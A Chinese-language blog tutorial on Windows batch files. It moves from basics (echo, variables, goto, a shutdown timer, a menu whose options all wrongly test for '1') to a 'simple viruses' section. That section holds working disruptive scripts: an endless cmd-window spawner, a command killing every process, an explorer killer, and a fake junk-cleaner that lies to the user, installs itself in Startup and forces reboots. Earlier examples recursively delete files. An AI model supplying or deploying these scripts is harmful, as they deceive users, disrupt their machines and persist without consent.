批处理

windows
windows
发布日期:   2022-10-22
文章字数:   454
阅读次数:  

批处理是windows里的脚本，可以自动批量运行脚本里的多个指令

后缀： .bat

批处理作用：
        自上而下成批的处理每一条指令，直到执行到最后一条

初试牛刀

新建一个记事本，后缀改为bat，然后右键点击编辑，批处理命令写好后，点击桌面的1.bat，就会执行批处理脚本

g:
cd \
cd test 
del *.* /s /q

也可以再cmd命令行执行1.bat,这样会显示操作步骤

@echo off 关闭命令回显

@echo off                 <-------
g:
cd \
cd test
del *.* /s /q

关闭提示

@echo off
g:
cd \
cd test
del *.* /s /q   >null        <-------

窗口暂停

@echo off
g:
cd \
cd test
del *.* /s /q   >null
pause                       <-------

设置标题

title 九头蛇

换行

echo.

设置变量

set /p  time=请输入时间     #time是变量值

引用变量

%time%

goto跳转

@echo off
echo  跳过中间的命令，直接执行最后一条命令
goto last
dir 
type a.txt
:last
dir a.txt
pause

定时关机小程序

@echo off
color 0a
title QQ
echo =====================
echo.
echo 欢迎使用定时关机小程序
echo.
echo =====================
set /p time=请输入时间：
shutdown -s -t %time%
pause

如果遇到执行批处理报错，不清楚哪里报错，可以在cmd窗口执行批处理程序，会显示报错信息

菜单小程序

@echo off
title 菜单程序
color 0a
:menu
cls
echo ================================
echo.
echo             菜单
echo          1.定时关机
echo          2.查看IP
echo          3.取消定时关机
echo          4.退出
echo.
echo ================================

set /p number=请输入选项：
if "%number%"=="1"  goto a
if "%number%"=="1"  goto b
if "%number%"=="1"  goto c
if "%number%"=="1"  goto d

:a
set /p time=请输入时间：
shutdown -s -t %time%
pause
goto menu 

:b
ipconfig
pause
goto menu

:c
shutdown -a
echo 您的定时计划已取消
pause
goto menu

:d
exit

简单病毒

无限弹出cmd窗口

1、

# 新建bat文件  右键编辑
start cmd   
#然后将bat文件命名为cmd.bat
#会出现无线循环弹出cmd窗口的情况

2、

start cmd
%0

#不管你的bat文件命名是什么，都会无限弹出cmd窗口
# %0代表当前文件名称的绝对路径

蓝屏

taskkill /f /fi "pid ne 1"
# /f   强制
# /fi  过滤
# 后面不加ne 表示过滤 pid为1的
# 后面加了ne 表示除了pid为1的不杀掉，其他全部杀掉

不显示桌面

taskkill /im   explorer.exe  /f
# /im 表示过滤某个进程的名称

桌面不显示后，可以按住Ctrl+Alt+Delete键

打开任务管理器

找到被杀掉的进程 explorer.exe

在C:\Windows下

@echo off
color 0a
echo　清理垃圾,现在开始,请耐心等待.........
echo.
echo.
ping 127.0.0.1 -n 2  >nul
echo 倒计时 5

echo 倒计时 4
ping 127.0.0.1 -n 2  >nul
echo 倒计时 3
ping 127.0.0.1 -n 2 >nul
echo 倒计时 2
ping 127.0.0.1 -n 2 >nul
echo 倒计时 1
ping 127.0.0.1 -n 5 >nul
echo　糟糕！！！清理垃圾时出现问题！！！！

taskkill /im explorer.exe /f   >nul

ping 127.0.0.1 -n 10 >nul
start C:\Windows\explorer.exe  
ping 127.0.0.1 -n 3 >nul
echo　不要担心，垃圾已清理完成！
echo  重启

copy  清理垃圾.bat  "%useprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"  >nul
shutdown -r -t 10

将无限cmd放置到启动项

@echo off
echo start cmd > C:\Windows\windowns.bat
echo %%0 >>C:\Windows\windowns.bat
copy  C:\Windows\windowns.bat    "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"  >nul
